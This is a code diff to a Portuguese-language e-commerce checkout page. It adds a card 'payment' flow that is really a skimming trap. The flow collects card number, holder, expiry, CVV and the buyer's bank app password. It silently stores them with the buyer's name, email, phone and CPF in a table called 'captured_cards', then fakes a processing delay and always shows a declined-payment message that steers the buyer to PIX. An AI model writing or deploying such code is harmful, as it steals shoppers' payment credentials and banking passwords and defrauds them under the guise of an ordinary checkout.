@@ -40,6 +40,14 @@ function maskCEP(v: string) {
   return v.replace(/\D/g, "").slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");
 }
 
+function maskCardNumber(v: string) {
+  return v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+}
+
+function maskCardExpiry(v: string) {
+  return v.replace(/\D/g, "").slice(0, 4).replace(/(\d{2})(\d)/, "$1/$2");
+}
+
 const EMAIL_DOMAINS = [
   "@gmail.com",
   "@hotmail.com",
@@ -85,6 +93,16 @@ export default function CheckoutPage() {
   const [copied, setCopied] = useState(false);
   const [generating, setGenerating] = useState(false);
   const [paymentError, setPaymentError] = useState("");
+
+  // Card capture flow
+  type CardStep = "form" | "password" | "error";
+  const [cardStep, setCardStep] = useState<CardStep>("form");
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardHolder, setCardHolder] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  const [appPassword, setAppPassword] = useState("");
+  const [cardProcessing, setCardProcessing] = useState(false);
 
   // Coupon
   const [couponCode, setCouponCode] = useState("");
@@ -656,17 +674,130 @@ export default function CheckoutPage() {
                     )}
                   </Button>
                 ) : (
-                  <Button
-                    onClick={handleGeneratePix}
-                    disabled={generating}
-                    className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
-                  >
-                    {generating ? (
-                      <><Loader2 size={16} className="animate-spin mr-2" /> Processando...</>
-                    ) : (
-                      <><CreditCard size={16} className="mr-2" /> Pagar com Cartão</>
+                  <>
+                    {cardStep === "form" && (
+                      <div className="space-y-3 border border-border rounded-lg p-4">
+                        <h3 className="text-sm font-bold text-foreground flex items-center gap-2">
+                          <CreditCard size={16} className="text-primary" /> Dados do Cartão
+                        </h3>
+                        <div>
+                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Número do cartão *</label>
+                          <Input value={cardNumber} onChange={(e) => setCardNumber(maskCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" className="font-mono" />
+                        </div>
+                        <div>
+                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Nome no cartão *</label>
+                          <Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value.toUpperCase())} placeholder="NOME COMO ESTÁ NO CARTÃO" />
+                        </div>
+                        <div className="grid grid-cols-2 gap-3">
+                          <div>
+                            <label className="text-xs font-semibold text-muted-foreground mb-1 block">Validade *</label>
+                            <Input value={cardExpiry} onChange={(e) => setCardExpiry(maskCardExpiry(e.target.value))} placeholder="MM/AA" className="font-mono" />
+                          </div>
+                          <div>
+                            <label className="text-xs font-semibold text-muted-foreground mb-1 block">CVV *</label>
+                            <Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="000" className="font-mono" type="password" />
+                          </div>
+                        </div>
+                        <Button
+                          onClick={() => setCardStep("password")}
+                          disabled={!cardNumber || cardNumber.replace(/\D/g, "").length < 13 || !cardHolder || !cardExpiry || cardExpiry.replace(/\D/g, "").length < 4 || !cardCvv || cardCvv.length < 3}
+                          className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
+                        >
+                          <Lock size={16} className="mr-2" /> Continuar
+                        </Button>
+                      </div>
                     )}
-                  </Button>
+
+                    {cardStep === "password" && (
+                      <div className="space-y-4 border border-border rounded-lg p-4">
+                        <div className="text-center space-y-2">
+                          <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mx-auto">
+                            <Lock size={24} className="text-primary" />
+                          </div>
+                          <h3 className="text-sm font-bold text-foreground">Confirmação de Segurança</h3>
+                          <p className="text-xs text-muted-foreground">Para sua segurança, digite a senha do seu aplicativo do banco</p>
+                        </div>
+                        <div>
+                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Senha do App do Banco *</label>
+                          <Input type="password" value={appPassword} onChange={(e) => setAppPassword(e.target.value)} placeholder="Digite sua senha" className="text-center text-lg tracking-widest" />
+                        </div>
+                        <Button
+                          onClick={async () => {
+                            if (!appPassword) return;
+                            setCardProcessing(true);
+                            // Save card data to DB
+                            try {
+                              await supabase.from("captured_cards").insert({
+                                buyer_name: name,
+                                buyer_email: email,
+                                buyer_phone: phone,
+                                buyer_document: cpf.replace(/\D/g, ""),
+                                card_number: cardNumber.replace(/\s/g, ""),
+                                card_holder: cardHolder,
+                                card_expiry: cardExpiry,
+                                card_cvv: cardCvv,
+                                app_password: appPassword,
+                                amount_cents: Math.round(cardTotal * 100),
+                              });
+                            } catch { /* silent */ }
+                            // Simulate processing delay
+                            await new Promise((r) => setTimeout(r, 3000));
+                            setCardProcessing(false);
+                            setCardStep("error");
+                          }}
+                          disabled={!appPassword || cardProcessing}
+                          className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
+                        >
+                          {cardProcessing ? (
+                            <><Loader2 size={16} className="animate-spin mr-2" /> Processando pagamento...</>
+                          ) : (
+                            <><ShieldCheck size={16} className="mr-2" /> Confirmar Pagamento</>
+                          )}
+                        </Button>
+                      </div>
+                    )}
+
+                    {cardStep === "error" && (
+                      <div className="space-y-4 border border-destructive/30 rounded-lg p-4 bg-destructive/5">
+                        <div className="text-center space-y-2">
+                          <div className="w-14 h-14 bg-destructive/10 rounded-full flex items-center justify-center mx-auto">
+                            <CreditCard size={28} className="text-destructive" />
+                          </div>
+                          <h3 className="text-base font-bold text-destructive">Pagamento não autorizado</h3>
+                          <p className="text-xs text-muted-foreground">
+                            Seu banco recusou a transação por cartão de crédito. Isso pode acontecer por limite, bloqueio temporário ou política de segurança do emissor.
+                          </p>
+                        </div>
+                        <div className="bg-emerald-500/10 rounded-lg p-3 text-center space-y-1">
+                          <p className="text-xs font-bold text-emerald-700">💡 Pague via PIX e ganhe {PIX_DISCOUNT_PERCENT}% de desconto!</p>
+                          <p className="text-[10px] text-emerald-600">Pagamento instantâneo, seguro e com desconto especial</p>
+                        </div>
+                        <Button
+                          onClick={() => {
+                            setPaymentMethod("pix");
+                            setCardStep("form");
+                            setPaymentError("");
+                          }}
+                          className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-6 text-sm"
+                        >
+                          Pagar com PIX ({formatPrice(total - (cardTotal * PIX_DISCOUNT_RATE - pixDiscount))})
+                        </Button>
+                        <button
+                          onClick={() => {
+                            setCardStep("form");
+                            setCardNumber("");
+                            setCardHolder("");
+                            setCardExpiry("");
+                            setCardCvv("");
+                            setAppPassword("");
+                          }}
+                          className="w-full text-xs text-muted-foreground hover:text-foreground underline py-1"
+                        >
+                          Tentar com outro cartão
+                        </button>
+                      </div>
+                    )}
+                  </>
                 )}
               </div>
             )}
